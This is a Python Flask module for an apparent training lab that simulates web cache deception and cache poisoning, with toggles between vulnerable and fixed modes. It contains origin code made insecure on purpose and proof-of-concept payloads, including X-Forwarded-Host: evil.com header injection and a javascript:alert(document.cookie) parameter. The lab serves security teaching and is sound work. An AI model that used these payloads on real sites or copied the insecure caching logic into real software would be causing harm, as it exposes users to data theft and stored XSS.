import re

from flask import Blueprint, jsonify, render_template, request

from . import models as M

bp = Blueprint('lab', __name__)

GOOD_HOST = M.GOOD_HOST


# ---------- origin (backend) ----------

def _profile_page(uid):
    if uid == 'victim':
        data = {'uid': 'victim', 'nama': 'Victim Ku', 'saldo': 'Rp 5.250.000',
                'kartu': '**** 9981', 'flag': M.FLAG}
    else:
        data = {'uid': uid, 'nama': 'Pengguna ' + uid, 'saldo': 'Rp 0', 'kartu': '-'}
    return '<h1>Profile</h1><pre>' + str(data) + '</pre>'


def _home_html(fhost=None, ref=None):
    host = fhost or GOOD_HOST
    banner = ''
    if ref:
        banner = f'<div class="cta">Lanjut ke: <a href="{ref}">{ref}</a></div>'
    return (f'<h1>Shop Evil Mart</h1>'
            f'<script src="//{host}/assets/app.js"></script>'
            + banner +
            '<p>laman utama toko online</p>')


def _origin(path, params, auth, fhost):
    if path.startswith('/profile/'):
        uid = path.split('/')[2].split('.')[0]
        if M.setting('s1'):
            if auth:
                return {'status': 200,
                        'headers': {'cache-control': 'public, max-age=3600',
                                    'x-role': 'victim-data'},
                        'html': _profile_page(uid), 'private': True}
            return {'status': 401,
                    'headers': {'cache-control': 'no-store'},
                    'html': '<h1>403 - login needed</h1>', 'private': False}
        if path.endswith('.css'):
            return {'status': 404,
                    'headers': {'cache-control': 'public, max-age=3600'},
                    'html': '/* tidak ada resource ini */', 'private': False}
        if auth:
            return {'status': 200,
                    'headers': {'cache-control': 'no-store'},
                    'html': _profile_page(uid), 'private': True}
        return {'status': 401,
                'headers': {'cache-control': 'no-store'},
                'html': '<h1>403 - login needed</h1>', 'private': False}

    if path == '/welcome':
        if M.setting('s2'):
            return {'status': 302,
                    'headers': {'location': f'https://{fhost}/dashboard',
                                'cache-control': 'public, max-age=600'},
                    'html': '', 'private': False}
        if fhost != GOOD_HOST:
            return {'status': 400,
                    'headers': {'cache-control': 'no-store'},
                    'html': '<h1>bad host</h1>', 'private': False}
        return {'status': 302,
                'headers': {'location': f'https://{GOOD_HOST}/dashboard',
                            'cache-control': 'no-store'},
                'html': '', 'private': False}

    if path == '/':
        if M.setting('s3') and fhost != GOOD_HOST:
            return {'status': 200,
                    'headers': {'cache-control': 'public, max-age=3600'},
                    'html': _home_html(fhost=fhost), 'private': False}
        if not M.setting('s3') and fhost != GOOD_HOST:
            return {'status': 400,
                    'headers': {'cache-control': 'no-store'},
                    'html': '<h1>forbidden host</h1>', 'private': False}
        if M.setting('s4') and params:
            ref = params.get('ref', params.get('next', ''))
            return {'status': 200,
                    'headers': {'cache-control': 'public, max-age=3600'},
                    'html': _home_html(fhost=fhost, ref=ref), 'private': False}
        if not M.setting('s4') and any(k not in ('page',) for k in params):
            return {'status': 400,
                    'headers': {'cache-control': 'no-store'},
                    'html': '<h1>param tidak dikenal</h1>', 'private': False}
        return {'status': 200,
                'headers': {'cache-control': 'public, max-age=3600'},
                'html': _home_html(fhost=fhost), 'private': False}

    return {'status': 404,
            'headers': {'cache-control': 'public, max-age=60'},
            'html': '<h1>404</h1>', 'private': False}


def _cacheable(resp):
    return 'no-store' not in str(resp['headers'].get('cache-control', ''))


def fetch(url, headers=None, authed=False):
    """round-trip CDN+cache: cache-hit -> jika 'mencurigakan' paksa origin -> simpan."""
    path, _, qs = url.partition('?')
    if not path.startswith('/'):
        path = '/' + path
    hdrs = {k.lower(): v for k, v in (headers or {}).items()}
    auth = authed or ('session=victim' in str(hdrs.get('cookie', '')))
    fhost = hdrs.get('x-forwarded-host') or hdrs.get('host') or GOOD_HOST
    params = {}
    if qs:
        for pair in qs.split('&'):
            k, _, v = pair.partition('=')
            if k:
                params[k] = v
    suspicious = (fhost != GOOD_HOST) or bool(params)

    if not suspicious and path in M.CACHE:
        return _res(True, path, M.CACHE[path])

    resp = _origin(path, params, auth, fhost)
    if _cacheable(resp):
        M.CACHE[path] = resp
    return _res(False, path, resp)


def _res(cached, path, resp):
    return {'cached': cached, 'path': path,
            'status': resp['status'],
            'headers': dict(resp.get('headers', {})),
            'html': resp['html'],
            'private': resp.get('private', False)}


def _clean():
    M.reset_cache()


# ---------- PoC ----------

def _finish(ok, steps, flag=None):
    out = {'steps': steps, 'ok': ok}
    if flag:
        out['flag'] = flag
    return out


def _poc_s1():
    _clean()
    steps = ['1. Victim (login) buka laman privatenya dengan padding ekorasar:',
             '   HTTP GET /profile/victim.css  (Cache-Control: public)']
    if not M.setting('s1'):
        steps += ['FIXED: profil privat kirim no-store; padding .css tolak (404)',
                  '   -> tidak pernah masuk cache-> BLOCKED.']
        return _finish(False, steps)
    victim_r = fetch('/profile/victim.css', authed=True)
    steps += [f'2. (RENTAN) Origin balas data privat victim ({victim_r["status"]})',
              '   + Cache-Control public -> TERSIMPAN di cache.']
    atk = fetch('/profile/victim.css')
    steps += [f'3. Attacker replay /profile/victim.css TANPA login -> cache-hit {atk["cached"]}',
              f'4. Data privat victim bocor {atk["status"]}: {atk["html"][:70]}...']
    if atk.get('cached') and 'flag' in atk['html']:
        m = re.search(r"'flag': '([^']+)'", atk['html'])
        M.log('s1', 'web cache deception: profile .css padding bocorkan data victim')
        return _finish(True, steps, m.group(1) if m else M.FLAG)
    return _finish(False, steps)


def _poc_s2():
    _clean()
    steps = ['1. Attacker minta laman /welcome dengan Host pihak luar:',
             '   GET /welcome  X-Forwarded-Host: evil.com']
    if not M.setting('s2'):
        steps += ['FIXED: Host tak dikenal -> origin 400; redirect tak dicache',
                  '   -> /welcome tetap redirect ke host asli -> BLOCKED.']
        return _finish(False, steps)
    atk = fetch('/welcome', headers={'X-Forwarded-Host': 'evil.com'})
    steps += [f'2. (RENTAN) Origin 302 ke https://evil.com/dashboard ({atk["status"]})',
              '   -> respon di-CACHE dengan kunci /welcome.']
    vic = fetch('/welcome')
    steps += [f'3. Victim buka /welcome -> cache-hit {vic["cached"]} ->',
              f'4. DILEMPAR 302 ke host penyerang ({vic["headers"].get("location")})',
              '   -> semua pengunjung laman itu kena phish/SEO-jack.']
    if vic.get('cached') and 'evil.com' in vic['headers'].get('location', ''):
        M.log('s2', 'cache poisoning: 302 /welcome -> evil.com untuk semua visitor')
        return _finish(True, steps, M.FLAG)
    return _finish(False, steps)


def _poc_s3():
    _clean()
    steps = ['1. Attacker minta HOMEPAGE dengan header tak ber-key:',
             '   GET /  X-Forwarded-Host: evil.com']
    if not M.setting('s3'):
        steps += ['FIXED: X-Forwarded-Host divalidasi -> 400; script memakai host aman',
                  '   -> tidak ada racunan masuk cache -> BLOCKED.']
        return _finish(False, steps)
    atk = fetch('/', headers={'X-Forwarded-Host': 'evil.com'})
    steps += ['2. (RENTAN) Origin render: <script src="//evil.com/assets/app.js">',
              '   -> respon di-CACHE dengan kunci /.']
    vic = fetch('/')
    steps += [f'3. Victim buka / -> cache-hit {vic["cached"]}',
              '4. Script dari evil.com di-load SEMUA pengunjung -> stored XSS.']
    if vic.get('cached') and 'evil.com' in vic['html']:
        M.log('s3', "unkeyed X-Forwarded-Host: racun di '/' melayani semua user")
        return _finish(True, steps, M.FLAG)
    return _finish(False, steps)


def _poc_s4():
    _clean()
    steps = ['1. Attacker minta homepage dengan param TAK ter-key di cache key:',
             '   GET /?ref=javascript:alert(document.cookie)%2F%2F']
    if not M.setting('s4'):
        steps += ['FIXED: hanya param whitelist (page); param lain -> 400',
                  '   -> tidak direfleksikan, tidak di-cache -> BLOCKED.']
        return _finish(False, steps)
    atk = fetch('/?ref=javascript:alert(document.cookie)//')
    steps += ['2. (RENTAN) Origin refleksikan ?ref ke dalam HTML laman',
              '   (cache key = hanya path "/", param TIDAK masuk key),',
              '   -> versi bereacun tersimpan dengan kunci /.', ]
    vic = fetch('/')
    steps += [f'3. Victim buka / -> cache-hit {vic["cached"]}',
              '4. Payload javascript: memuat di laman untuk semua pengunjung cache']
    if vic.get('cached') and 'javascript:' in vic['html']:
        M.log('s4', 'unkeyed param: reflex content di-cache untuk laman /')
        return _finish(True, steps, M.FLAG)
    return _finish(False, steps)


POCS = {'s1': _poc_s1, 's2': _poc_s2, 's3': _poc_s3, 's4': _poc_s4}


# ---------- halaman & api ----------

@bp.route('/')
def index():
    return render_template('index.html', modes=M.all_settings())


@bp.route('/logs')
def logs():
    return render_template('logs.html', logs=M.last_logs())


@bp.route('/run/<sid>')
def run_page(sid):
    if sid not in POCS:
        return 'unknown', 404
    return render_template('result.html', sid=sid, d=POCS[sid](),
                           label={'s1': 'Web Cache Deception (.css padding -> data privat)',
                                  's2': 'Poison 302 redirect via unkeyed Host',
                                  's3': 'Unkeyed X-Forwarded-Host -> stored XSS',
                                  's4': 'Unkeyed param -> stored XSS di homepage'}[sid])


@bp.route('/api/state')
def api_state():
    return jsonify(M.all_settings())


@bp.route('/api/toggle/<sid>', methods=['POST'])
def api_toggle(sid):
    if sid not in ('s1', 's2', 's3', 's4'):
        return jsonify({'error': 'invalid id'}), 400
    data = request.get_json(silent=True) or {}
    if 'vulnerable' in data or 'on' in data:
        v = bool(data.get('vulnerable', data.get('on', True)))
    else:
        v = not M.setting(sid)
    M.set_setting(sid, v)
    M.log('setting', f'{sid} -> {"RENTAN" if M.setting(sid) else "FIXED"}')
    return jsonify({'id': sid, 'vulnerable': M.setting(sid)})


@bp.route('/api/poc/<sid>', methods=['POST'])
def api_poc(sid):
    if sid not in POCS:
        return jsonify({'error': 'invalid id'}), 400
    return jsonify({'id': sid, **POCS[sid]()})


@bp.route('/api/fetch', methods=['POST'])
def api_fetch():
    body = request.get_json(silent=True) or {}
    return jsonify(fetch(body.get('url', '/'),
                         headers=body.get('headers'),
                         authed=bool(body.get('authed'))))


@bp.route('/api/cache')
def api_cache():
    return jsonify({k: {'status': v['status'], 'private': v.get('private', False),
                        'poisoned': True if 'evil.com' in v['html'] or 'javascript:' in v['html']
                        or v.get('private') else False,
                        'seq': i} for i, (k, v) in enumerate(M.CACHE.items())})